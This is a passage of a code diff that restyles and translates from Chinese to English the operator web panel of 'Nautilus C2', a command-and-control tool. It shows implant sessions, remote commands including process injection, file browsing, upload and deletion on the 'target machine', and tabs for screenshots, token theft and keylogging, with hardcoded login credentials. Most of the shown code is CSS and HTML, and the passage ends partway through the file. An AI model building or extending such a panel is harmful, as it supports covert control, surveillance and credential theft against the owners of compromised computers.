@@ -6,212 +6,353 @@
 <title>Nautilus C2</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#0a0e17;--surface:#111827;--surface2:#151b28;--border:#1e2a3a;--text:#c8d6e5;--dim:#576574;--accent:#4ecdc4;--accent2:#3abfb0;--danger:#ee5a24;--warn:#f39c12;--success:#4ecdc4}
-body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column}
+:root{
+  --bg:#080c14;--bg2:#0b1120;--surface:#0f1729;--surface2:#141e33;
+  --border:#1a2744;--border2:#243352;
+  --text:#c8d6e5;--dim:#4a6080;--bright:#e8f0fe;
+  --cyan:#00e5ff;--cyan2:#00b8d4;--cyan-dim:rgba(0,229,255,0.15);
+  --green:#00e676;--green2:#00c853;--green-dim:rgba(0,230,118,0.12);
+  --red:#ff1744;--red-dim:rgba(255,23,68,0.12);
+  --yellow:#ffc400;--yellow-dim:rgba(255,196,0,0.12);
+  --blue:#2979ff;--purple:#b388ff;
+  --font-mono:'Cascadia Code','Fira Code','Consolas','Courier New',monospace;
+  --font-ui:'Segoe UI',system-ui,-apple-system,sans-serif;
+  --radius:6px;--radius2:4px;
+}
+body{background:var(--bg);color:var(--text);font-family:var(--font-ui);height:100vh;overflow:hidden}
 
-/* Login */
-.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh;background:var(--bg)}
-.login-box{background:var(--surface2);padding:40px;border-radius:12px;border:1px solid var(--border);width:360px}
-.login-box h1{text-align:center;color:var(--accent);font-size:24px;margin-bottom:24px}
-.login-box input{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:6px;margin-bottom:12px;font-size:14px;outline:none}
-.login-box input:focus{border-color:var(--accent)}
-.login-box button{width:100%;background:var(--accent);color:var(--bg);border:none;padding:12px;border-radius:6px;cursor:pointer;font-weight:600;font-size:15px;margin-top:8px}
-.login-box button:hover{background:var(--accent2)}
-.login-box .error{color:var(--danger);font-size:13px;text-align:center;margin-top:12px;display:none}
+/* === LOGIN === */
+.login-wrap{display:flex;align-items:center;justify-content:center;height:100vh;background:var(--bg);position:relative}
+.login-wrap::before{content:'';position:absolute;top:50%;left:50%;width:600px;height:600px;transform:translate(-50%,-50%);background:radial-gradient(circle,rgba(0,229,255,0.04) 0%,transparent 70%);pointer-events:none}
+.login-box{background:var(--surface);padding:48px 40px;border-radius:12px;border:1px solid var(--border);width:380px;position:relative}
+.login-box::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:60px;height:2px;background:var(--cyan);border-radius:0 0 2px 2px}
+.login-box h1{text-align:center;color:var(--cyan);font-size:22px;margin-bottom:8px;letter-spacing:2px;font-weight:300}
+.login-box .sub{text-align:center;color:var(--dim);font-size:12px;margin-bottom:28px;letter-spacing:1px}
+.login-box label{display:block;color:var(--dim);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
+.login-box input{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:11px 14px;border-radius:var(--radius);margin-bottom:18px;font-size:14px;outline:none;transition:border-color .2s}
+.login-box input:focus{border-color:var(--cyan)}
+.login-box button{width:100%;background:transparent;color:var(--cyan);border:1px solid var(--cyan);padding:12px;border-radius:var(--radius);cursor:pointer;font-weight:600;font-size:14px;letter-spacing:1px;transition:all .2s}
+.login-box button:hover{background:var(--cyan-dim)}
+.login-box .error{color:var(--red);font-size:12px;text-align:center;margin-top:14px;display:none}
 
-/* Main layout */
-.app{display:flex;height:100vh;flex-direction:column}
-.header{background:var(--surface2);padding:10px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border)}
-.header h1{font-size:16px;color:var(--accent);font-weight:600}
-.header-right{display:flex;align-items:center;gap:12px}
-.header-right .ws-status{font-size:12px}
-.header-right .ws-status.connected{color:var(--success)}
-.header-right .ws-status.disconnected{color:var(--danger)}
-.header-right .user{font-size:13px;color:var(--dim)}
-.header-right button{background:var(--surface);color:var(--dim);border:1px solid var(--border);padding:4px 10px;border-radius:4px;cursor:pointer;font-size:12px}
+/* === MAIN LAYOUT === */
+.app{display:flex;flex-direction:column;height:100vh}
+.header{background:var(--surface);padding:0 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);height:44px;flex-shrink:0}
+.header-left{display:flex;align-items:center;gap:14px}
+.header h1{font-size:14px;color:var(--cyan);font-weight:400;letter-spacing:2px}
+.header h1 span{color:var(--dim);font-size:11px;letter-spacing:0;margin-left:8px}
+.header-right{display:flex;align-items:center;gap:16px;font-size:12px}
+.ws-dot{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:6px}
+.ws-dot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
+.ws-dot.off{background:var(--red)}
+.header-right .sep{color:var(--border)}
+.header-right .user{color:var(--dim)}
+.header-right .btn-text{color:var(--dim);cursor:pointer;background:none;border:none;font-size:12px;font-family:var(--font-ui);padding:4px 8px;border-radius:var(--radius2);transition:all .15s}
+.header-right .btn-text:hover{color:var(--red);background:var(--red-dim)}
 
 .body{display:flex;flex:1;overflow:hidden}
-.sidebar{width:280px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column}
-.sidebar-header{padding:10px 16px;font-size:13px;color:var(--dim);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
-.sidebar-header .count{background:var(--accent);color:var(--bg);padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
-.session-list{flex:1;overflow-y:auto;padding:6px}
-.session-item{padding:10px;border-radius:6px;cursor:pointer;margin-bottom:3px;transition:background .15s;border:1px solid transparent;display:flex;align-items:flex-start;gap:10px}
+
+/* === SIDEBAR === */
+.sidebar{width:280px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
+.sidebar-header{padding:12px 16px;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:1.5px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.sidebar-header .count{color:var(--cyan);font-weight:600;font-size:12px;letter-spacing:0}
+.session-list{flex:1;overflow-y:auto;padding:4px}
+.session-item{padding:10px 12px;border-radius:var(--radius);cursor:pointer;margin-bottom:2px;transition:all .15s;border:1px solid transparent;display:flex;align-items:flex-start;gap:10px}
 .session-item:hover{background:var(--surface2)}
-.session-item.active{background:var(--surface2);border-color:var(--accent)}
-.session-item .dot{width:8px;height:8px;border-radius:50%;margin-top:4px}
-.session-item .dot.active{background:var(--success)}
-.session-item .dot.stale{background:var(--warn)}
-.session-item .dot.dead{background:var(--danger)}
-.session-item .info{flex:1}
-.session-item .info .name{font-size:13px;color:#e8f0fe;font-weight:500}
-.session-item .info .meta{font-size:11px;color:var(--dim);margin-top:3px}
+.session-item.active{background:var(--cyan-dim);border-color:rgba(0,229,255,0.3)}
+.session-item .dot{width:7px;height:7px;border-radius:50%;margin-top:5px;flex-shrink:0}
+.session-item .dot.active{background:var(--green);box-shadow:0 0 6px var(--green)}
+.session-item .dot.stale{background:var(--yellow);box-shadow:0 0 4px var(--yellow)}
+.session-item .dot.dead{background:var(--red);box-shadow:0 0 4px var(--red)}
+.session-item .info{flex:1;min-width:0}
+.session-item .info .name{font-size:13px;color:var(--bright);font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.session-item .info .meta{font-size:11px;color:var(--dim);margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.session-item .info .meta span{margin-right:8px}
 
-/* Tabs */
-.tabs-bar{padding:8px 16px;background:var(--surface2);border-bottom:1px solid var(--border);display:flex;gap:4px}
-.tab{padding:6px 14px;border-radius:4px;cursor:pointer;font-size:13px;color:var(--dim);transition:all .15s}
+/* === CONTENT === */
+.content{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+.tabs-bar{padding:0 16px;background:var(--surface);border-bottom:1px solid var(--border);display:flex;gap:0;height:38px;flex-shrink:0}
+.tab{padding:0 18px;cursor:pointer;font-size:12px;color:var(--dim);transition:all .15s;display:flex;align-items:center;border-bottom:2px solid transparent;letter-spacing:0.5px;text-transform:uppercase}
 .tab:hover{color:var(--text)}
-.tab.active{background:var(--accent);color:var(--bg);font-weight:600}
+.tab.active{color:var(--cyan);border-bottom-color:var(--cyan)}
+.tab-sep{width:1px;background:var(--border);margin:8px 4px}
+.tab-spacer{flex:1}
+.active-session-label{font-size:11px;color:var(--dim);display:flex;align-items:center;gap:6px}
+.active-session-label .sid{color:var(--cyan);font-family:var(--font-mono);font-size:11px}
 
-/* Main content */
-.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
-.toolbar{padding:8px 16px;background:var(--surface2);border-bottom:1px solid var(--border);display:flex;gap:6px;align-items:center}
-.toolbar button{background:var(--surface);color:var(--text);border:1px solid var(--border);padding:5px 12px;border-radius:4px;cursor:pointer;font-size:12px;transition:all .15s}
-.toolbar button:hover{background:var(--accent);color:var(--bg);border-color:var(--accent)}
-.toolbar button.primary{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:600}
-.toolbar .spacer{flex:1}
-.toolbar .session-label{font-size:12px;color:var(--accent);font-weight:500}
+/* === TAB PANELS === */
+.tab-panel{flex:1;display:none;flex-direction:column;overflow:hidden}
+.tab-panel.visible{display:flex}
 
-.output-area{flex:1;padding:12px 16px;overflow-y:auto;font-family:'Cascadia Code','Consolas',monospace;font-size:13px;line-height:1.6}
-.entry{margin-bottom:8px;padding:8px 10px;background:var(--surface);border-radius:4px;border-left:3px solid var(--border)}
-.entry.success{border-left-color:var(--success)}
-.entry.error{border-left-color:var(--danger)}
-.entry.pending{border-left-color:var(--warn)}
-.entry .cmd{color:var(--accent);font-weight:500;font-size:12px}
-.entry .result{color:var(--text);margin-top:4px;white-space:pre-wrap;word-break:break-all}
-.entry .meta{color:var(--dim);font-size:10px;margin-top:4px}
-.entry .download-btn{display:inline-block;margin-top:6px;background:var(--accent);color:var(--bg);padding:3px 10px;border-radius:3px;font-size:11px;cursor:pointer;font-family:'Segoe UI',sans-serif}
+/* === TERMINAL TAB === */
+.quick-bar{padding:6px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:4px;align-items:center;flex-shrink:0}
+.qbtn{background:transparent;color:var(--dim);border:1px solid var(--border);padding:3px 10px;border-radius:3px;cursor:pointer;font-size:11px;font-family:var(--font-mono);transition:all .15s;letter-spacing:0.5px}
+.qbtn:hover{color:var(--cyan);border-color:var(--cyan);background:var(--cyan-dim)}
+.qsep{width:1px;height:16px;background:var(--border);margin:0 4px}
 
-.input-bar{padding:8px 16px;background:var(--surface2);border-top:1px solid var(--border);display:flex;gap:6px;align-items:center}
-.input-bar .prefix{color:var(--accent);font-size:14px;font-weight:600}
-.input-bar input{flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:4px;font-family:'Cascadia Code','Consolas',monospace;font-size:13px;outline:none}
-.input-bar input:focus{border-color:var(--accent)}
-.input-bar button{background:var(--accent);color:var(--bg);border:none;padding:8px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:13px}
+.terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.terminal-output{flex:1;padding:12px 16px;overflow-y:auto;font-family:var(--font-mono);font-size:13px;line-height:1.7;color:var(--green)}
+.terminal-output .t-line{margin-bottom:2px}
+.terminal-output .t-cmd{color:var(--cyan);font-weight:500}
+.terminal-output .t-result{color:var(--green);white-space:pre-wrap;word-break:break-all}
+.terminal-output .t-error{color:var(--red);white-space:pre-wrap;word-break:break-all}
+.terminal-output .t-info{color:var(--dim);font-style:italic}
+.terminal-output .t-pending{color:var(--yellow)}
+.terminal-output .t-banner{color:var(--cyan);margin-bottom:4px}
+.terminal-output .t-divider{border-bottom:1px solid var(--border);margin:6px 0}
 
-/* File browser tab */
-.file-panel{flex:1;display:flex;flex-direction:column;padding:0;overflow:hidden}
-.file-toolbar{display:flex;gap:6px;padding:10px 16px;background:var(--surface2);border-bottom:1px solid var(--border);align-items:center}
-.file-toolbar input{flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;font-size:13px;outline:none;font-family:'Cascadia Code','Consolas',monospace}
-.file-toolbar input:focus{border-color:var(--accent)}
-.file-toolbar button{background:var(--accent);color:var(--bg);border:none;padding:7px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:12px}
-.file-toolbar button:hover{background:var(--accent2)}
-.file-toolbar .download-btn{background:#3498db}
-.file-toolbar .download-btn:hover{background:#2980b9}
-.file-toolbar .refresh-btn{background:var(--surface);color:var(--text);border:1px solid var(--border)}
-.file-toolbar .refresh-btn:hover{border-color:var(--accent);color:var(--accent)}
-.file-list{flex:1;overflow-y:auto;font-family:'Cascadia Code','Consolas',monospace;font-size:12px;background:var(--surface);margin:8px 16px;border-radius:4px;padding:8px;border:1px solid var(--border)}
-.file-entry{padding:5px 8px;border-radius:2px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
-.file-entry:hover{background:var(--surface2)}
-.file-entry:nth-child(odd){background:rgba(30,42,58,0.3)}
-.file-entry .fname{color:var(--accent);flex:1}
-.file-entry .fsize{color:var(--dim);font-size:11px;margin-left:12px;white-space:nowrap}
-.file-entry .fdir{color:var(--warn);margin-right:6px;font-size:10px}
-.file-bottom{padding:8px 16px 12px}
-.upload-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}
-.upload-row .upload-btn{background:var(--accent);color:var(--bg);border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-weight:600;font-size:12px}
-.upload-row .upload-btn:hover{background:var(--accent2)}
-.upload-row .del-btn{background:var(--danger);color:white;border:none;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px}
-.upload-area{border:1px dashed var(--border);padding:14px;text-align:center;color:var(--dim);font-size:13px;cursor:pointer;border-radius:4px;transition:border-color .2s}
-.upload-area:hover{border-color:var(--accent);color:var(--text)}
+.terminal-input-bar{padding:8px 16px;background:var(--bg2);border-top:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-shrink:0}
+.terminal-input-bar .prompt{color:var(--cyan);font-family:var(--font-mono);font-size:14px;font-weight:700}
+.terminal-input-bar input{flex:1;background:transparent;border:none;color:var(--green);padding:6px 0;font-family:var(--font-mono);font-size:13px;outline:none;caret-color:var(--cyan)}
+.terminal-input-bar input::placeholder{color:var(--dim)}
 
-/* Empty state */
-.empty-state{display:flex;align-items:center;justify-content:center;flex:1;color:var(--dim);font-size:14px;flex-direction:column}
-.empty-state .icon{font-size:48px;margin-bottom:12px;color:var(--border)}
+/* === FILES TAB === */
+.file-panel{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.file-toolbar{display:flex;gap:6px;padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);align-items:center;flex-shrink:0}
+.file-toolbar input{flex:1;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:var(--radius2);font-size:12px;outline:none;font-family:var(--font-mono)}
+.file-toolbar input:focus{border-color:var(--cyan)}
+.file-toolbar .fbtn{background:transparent;color:var(--dim);border:1px solid var(--border);padding:6px 12px;border-radius:var(--radius2);cursor:pointer;font-size:11px;transition:all .15s}
+.file-toolbar .fbtn:hover{color:var(--cyan);border-color:var(--cyan)}
+.file-toolbar .fbtn.primary{color:var(--cyan);border-color:var(--cyan)}
+.file-list{flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:12px;background:var(--bg);margin:8px 16px;border-radius:var(--radius);padding:4px;border:1px solid var(--border)}
+.file-entry{padding:5px 10px;border-radius:2px;display:flex;align-items:center;cursor:pointer;transition:background .1s}
+.file-entry:hover{background:var(--cyan-dim)}
+.file-entry .f-icon{width:18px;color:var(--dim);font-size:11px;flex-shrink:0}
+.file-entry .f-name{flex:1;color:var(--text);min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.file-entry .f-name.dir{color:var(--yellow)}
+.file-entry .f-size{color:var(--dim);font-size:11px;margin-left:16px;white-space:nowrap;min-width:70px;text-align:right}
+.file-entry .f-time{color:var(--dim);font-size:11px;margin-left:16px;white-space:nowrap;min-width:120px}
+.file-bottom{padding:8px 16px 12px;flex-shrink:0;border-top:1px solid var(--border);background:var(--bg2)}
+.file-bottom .upload-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}
+.file-bottom .fbtn-sm{background:transparent;border:1px solid var(--border);color:var(--dim);padding:5px 12px;border-radius:var(--radius2);cursor:pointer;font-size:11px;transition:all .15s}
+.file-bottom .fbtn-sm:hover{color:var(--cyan);border-color:var(--cyan)}
+.file-bottom .fbtn-sm.danger{color:var(--red)}
+.file-bottom .fbtn-sm.danger:hover{border-color:var(--red);background:var(--red-dim)}
+.file-bottom .upload-area{border:1px dashed var(--border);padding:12px;text-align:center;color:var(--dim);font-size:12px;cursor:pointer;border-radius:var(--radius2);transition:all .2s}
+.file-bottom .upload-area:hover{border-color:var(--cyan);color:var(--text)}
+.file-bottom .upload-status{font-size:11px;color:var(--dim)}
 
-/* Inline dialog */
-.dialog-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100}
-.dialog-box{background:var(--surface2);padding:24px;border-radius:8px;border:1px solid var(--border);width:400px}
-.dialog-box h3{color:var(--accent);font-size:16px;margin-bottom:16px}
-.dialog-box input{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:4px;font-size:13px;outline:none;margin-bottom:12px;font-family:'Cascadia Code','Consolas',monospace}
-.dialog-box input:focus{border-color:var(--accent)}
+/* === SCREENSHOT TAB === */
+.screenshot-panel{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.screenshot-toolbar{padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-shrink:0}
+.screenshot-toolbar .sbtn{background:transparent;border:1px solid var(--cyan);color:var(--cyan);padding:6px 14px;border-radius:var(--radius2);cursor:pointer;font-size:12px;transition:all .15s}
+.screenshot-toolbar .sbtn:hover{background:var(--cyan-dim)}
+.screenshot-toolbar .sinfo{color:var(--dim);font-size:11px;margin-left:8px}
+.screenshot-list{flex:1;overflow-y:auto;padding:16px;display:flex;flex-wrap:wrap;gap:12px;align-content:flex-start}
+.screenshot-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;width:420px;flex-shrink:0}
+.screenshot-card img{width:100%;display:block;cursor:pointer;border-bottom:1px solid var(--border)}
+.screenshot-card img:hover{opacity:0.9}
+.screenshot-card .sc-footer{padding:8px 12px;display:flex;justify-content:space-between;align-items:center}
+.screenshot-card .sc-time{font-size:11px;color:var(--dim)}
+.screenshot-card .sc-dl{background:transparent;border:1px solid var(--border);color:var(--dim);padding:3px 10px;border-radius:var(--radius2);cursor:pointer;font-size:11px;transition:all .15s}
+.screenshot-card .sc-dl:hover{color:var(--cyan);border-color:var(--cyan)}
+.screenshot-empty{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:13px;flex-direction:column}
+.screenshot-empty .s-icon{font-size:36px;margin-bottom:10px;color:var(--border)}
+
+/* === TOKEN TAB === */
+.token-panel{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.token-toolbar{padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:6px;align-items:center;flex-shrink:0}
+.token-toolbar .tbtn{background:transparent;border:1px solid var(--border);color:var(--dim);padding:6px 14px;border-radius:var(--radius2);cursor:pointer;font-size:12px;transition:all .15s}
+.token-toolbar .tbtn:hover{color:var(--cyan);border-color:var(--cyan)}
+.token-toolbar .tbtn.primary{border-color:var(--cyan);color:var(--cyan)}
+.token-output{flex:1;overflow-y:auto;padding:16px;font-family:var(--font-mono);font-size:13px}
+.token-output .t-result{white-space:pre-wrap;word-break:break-all;color:var(--green);line-height:1.6}
+.token-output .t-error{color:var(--red)}
+.token-empty{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:13px}
+
+/* === KEYLOG TAB === */
+.keylog-panel{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+.keylog-toolbar{padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:6px;align-items:center;flex-shrink:0}
+.keylog-toolbar .kbtn{background:transparent;border:1px solid var(--border);color:var(--dim);padding:6px 14px;border-radius:var(--radius2);cursor:pointer;font-size:12px;transition:all .15s}
+.keylog-toolbar .kbtn:hover{color:var(--cyan);border-color:var(--cyan)}
+.keylog-toolbar .kbtn.on{border-color:var(--green);color:var(--green)}
+.keylog-toolbar .kbtn.off{border-color:var(--red);color:var(--red)}
+.keylog-toolbar .kstatus{font-size:11px;color:var(--dim);margin-left:8px}
+.keylog-toolbar .kstatus.recording{color:var(--green)}
+.keylog-output{flex:1;overflow-y:auto;padding:16px;font-family:var(--font-mono);font-size:13px}
+.keylog-output pre{color:var(--green);white-space:pre-wrap;word-break:break-all;line-height:1.6;margin:0}
+.keylog-empty{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:13px}
+
+/* === DIALOG === */
+.dialog-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(2px)}
+.dialog-box{background:var(--surface);padding:28px;border-radius:8px;border:1px solid var(--border);width:400px;box-shadow:0 8px 32px rgba(0,0,0,0.5)}
+.dialog-box h3{color:var(--cyan);font-size:15px;margin-bottom:18px;font-weight:500}
+.dialog-box label{display:block;color:var(--dim);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
+.dialog-box input{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:var(--radius2);font-size:13px;outline:none;margin-bottom:16px;font-family:var(--font-mono)}
+.dialog-box input:focus{border-color:var(--cyan)}
 .dialog-box .btn-row{display:flex;gap:8px;justify-content:flex-end}
-.dialog-box .btn-row button{padding:8px 16px;border-radius:4px;cursor:pointer;font-size:13px;border:none}
-.dialog-box .btn-cancel{background:var(--surface);color:var(--dim);border:1px solid var(--border)}
-.dialog-box .btn-ok{background:var(--accent);color:var(--bg);font-weight:600}
+.dialog-box .btn-row button{padding:8px 20px;border-radius:var(--radius2);cursor:pointer;font-size:13px;border:none;font-family:var(--font-ui)}
+.dialog-box .btn-cancel{background:var(--surface2);color:var(--dim);border:1px solid var(--border)}
+.dialog-box .btn-cancel:hover{color:var(--text)}
+.dialog-box .btn-ok{background:var(--cyan);color:var(--bg);font-weight:600}
+.pid-dialog{width:520px;max-height:80vh;display:flex;flex-direction:column}
+.pid-dialog h3{margin-bottom:12px}
+.pid-search input{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:var(--radius2);font-size:13px;outline:none;font-family:var(--font-mono);margin-bottom:8px}
+.pid-search input:focus{border-color:var(--cyan)}
+.pid-list{max-height:320px;overflow-y:auto;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);margin-bottom:12px}
+.pid-row{display:flex;align-items:center;padding:6px 12px;cursor:pointer;border-bottom:1px solid var(--border);transition:background .15s}
+.pid-row:hover{background:var(--surface2)}
+.pid-row.pid-selected-row{background:rgba(0,255,200,0.1);border-left:3px solid var(--green)}
+.pid-num{color:var(--cyan);font-family:var(--font-mono);font-size:12px;min-width:60px;font-weight:600}
+.pid-name{color:var(--text);font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pid-footer{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.pid-selected{color:var(--dim);font-size:12px;font-family:var(--font-mono);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dialog-box .btn-ok:hover{background:var(--cyan2)}
 
-/* Scrollbar */
-::-webkit-scrollbar{width:6px}
-::-webkit-scrollbar-track{background:var(--bg)}
+/* === SCROLLBAR === */
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
-::-webkit-scrollbar-thumb:hover{background:#3a4a5a}
+::-webkit-scrollbar-thumb:hover{background:var(--border2)}
 </style>
 </head>
 <body>
 
-<!-- Login screen -->
+<!-- Login -->
 <div class="login-wrap" id="login-screen">
 <div class="login-box">
-  <h1>Nautilus C2</h1>
-  <input type="text" id="login-user" placeholder="用户名" value="nautilus">
-  <input type="password" id="login-pass" placeholder="密码" value="nautilus2026">
-  <button onclick="doLogin()">登录</button>
-  <div class="error" id="login-error">认证失败</div>
+  <h1>NAUTILUS</h1>
+  <div class="sub">COMMAND & CONTROL</div>
+  <label>USERNAME</label>
+  <input type="text" id="login-user" placeholder="Username" value="nautilus">
+  <label>PASSWORD</label>
+  <input type="password" id="login-pass" placeholder="Password" value="nautilus2026">
+  <button onclick="doLogin()">AUTHENTICATE</button>
+  <div class="error" id="login-error">Authentication failed</div>
 </div>
 </div>
 
-<!-- Main app -->
+<!-- Main App -->
 <div class="app" id="app-screen" style="display:none">
 <div class="header">
-  <h1>Nautilus C2</h1>
+  <div class="header-left">
+    <h1>NAUTILUS <span>C2</span></h1>
+  </div>
   <div class="header-right">
-    <span class="ws-status disconnected" id="ws-status">WS: 断开</span>
+    <span><span class="ws-dot off" id="ws-dot"></span><span id="ws-status">DISCONNECTED</span></span>
+    <span class="sep">|</span>
     <span class="user" id="user-info">nautilus</span>
-    <button onclick="doLogout()">退出登录</button>
+    <button class="btn-text" onclick="doLogout()">LOGOUT</button>
   </div>
 </div>
 
 <div class="body">
+  <!-- Sidebar -->
   <div class="sidebar">
     <div class="sidebar-header">
-      <span>会话列表</span>
+      <span>SESSIONS</span>
       <span class="count" id="session-count">0</span>
     </div>
     <div class="session-list" id="session-list"></div>
   </div>
 
+  <!-- Content -->
   <div class="content">
     <div class="tabs-bar">
-      <div class="tab active" onclick="switchTab('terminal')">交互终端</div>
-      <div class="tab" onclick="switchTab('files')">文件管理</div>
-      <div class="spacer"></div>
-      <div class="session-label" id="active-label">无活跃会话</div>
+      <div class="tab active" onclick="switchTab('terminal')">Terminal</div>
+      <div class="tab-sep"></div>
+      <div class="tab" onclick="switchTab('files')">Files</div>
+      <div class="tab-sep"></div>
+      <div class="tab" onclick="switchTab('screenshot')">Screenshot</div>
+      <div class="tab-sep"></div>
+      <div class="tab" onclick="switchTab('token')">Token</div>
+      <div class="tab-sep"></div>
+      <div class="tab" onclick="switchTab('keylog')">Keylog</div>
+      <div class="tab-spacer"></div>
+      <div class="active-session-label" id="active-label">No active session</div>
     </div>
 
-    <!-- Terminal tab -->
-    <div id="tab-terminal" style="flex:1;display:flex;flex-direction:column;overflow:hidden">
-      <div class="toolbar">
-        <button class="primary" onclick="sendTask('sysinfo')">系统信息</button>
-        <button onclick="sendTask('proclist')">进程列表</button>
-        <button onclick="sendTask('privinfo')">权限信息</button>
-        <button onclick="promptTask('listdir')">目录浏览</button>
-        <button onclick="promptTask('kill')">终止进程</button>
-        <div class="spacer"></div>
+    <!-- Terminal Tab -->
+    <div class="tab-panel visible" id="tab-terminal">
+      <div class="quick-bar">
+        <button class="qbtn" onclick="sendTask('sysinfo')">sysinfo</button>
+        <button class="qbtn" onclick="sendTask('proclist')">proclist</button>
+        <button class="qbtn" onclick="sendTask('privinfo')">privinfo</button>
+        <div class="qsep"></div>
+        <button class="qbtn" onclick="promptTask('listdir')">listdir</button>
+        <button class="qbtn" onclick="promptTask('kill')">kill</button>
+        <button class="qbtn" onclick="promptTask('inject')">inject</button>
       </div>
-      <div class="output-area" id="output">
-        <div class="empty-state">
-          <div class="icon">&#9783;</div>
-          <div>等待植入体连接...</div>
+      <div class="terminal-wrap">
+        <div class="terminal-output" id="term-output">
+          <div class="t-line t-banner">Nautilus C2 - Terminal</div>
+          <div class="t-line t-info">Waiting for implant connection...</div>
         </div>
-      </div>
-      <div class="input-bar">
-        <span class="prefix">&gt;</span>
-        <input type="text" id="cmd-input" placeholder="输入命令..." onkeydown="if(event.key==='Enter')execCmd()">
-        <button onclick="execCmd()">执行</button>
+        <div class="terminal-input-bar">
+          <span class="prompt">&gt;</span>
+          <input type="text" id="cmd-input" placeholder="Enter command..." onkeydown="if(event.key==='Enter')execCmd()">
+        </div>
       </div>
     </div>
 
-    <!-- Files tab -->
-    <div id="tab-files" class="file-panel" style="display:none">
-      <div class="file-toolbar">
-        <input type="text" id="file-path" placeholder="输入路径，如 C:\Users\ 或 /tmp/" value="C:\">
-        <button onclick="browseDir()">浏览</button>
-        <button onclick="goUpDir()">上级</button>
-        <button class="refresh-btn" onclick="browseDir()">刷新</button>
-        <div class="spacer"></div>
-        <span style="font-size:11px;color:var(--dim)">提示: 点击目录进入，点击文件下载</span>
-      </div>
-      <div class="file-list" id="file-list">
-        <div style="color:var(--dim);padding:20px;text-align:center">输入路径并点击浏览查看目标机器文件</div>
-      </div>
-      <div class="file-bottom">
-        <div class="upload-row">
-          <button class="upload-btn" onclick="triggerUpload()">上传文件到目标</button>
-          <button class="del-btn" onclick="promptFileDel()">删除文件</button>
-          <span style="font-size:11px;color:var(--dim)" id="upload-status"></span>
+    <!-- Files Tab -->
+    <div class="tab-panel" id="tab-files">
+      <div class="file-panel">
+        <div class="file-toolbar">
+          <input type="text" id="file-path" placeholder="Path, e.g. C:\Users\ or /tmp/" value="C:\">
+          <button class="fbtn primary" onclick="browseDir()">Browse</button>
+          <button class="fbtn" onclick="goUpDir()">Up</button>
+          <button class="fbtn" onclick="browseDir()">Refresh</button>
         </div>
-        <div class="upload-area" onclick="triggerUpload()">
-          点击或拖拽文件上传到目标机器
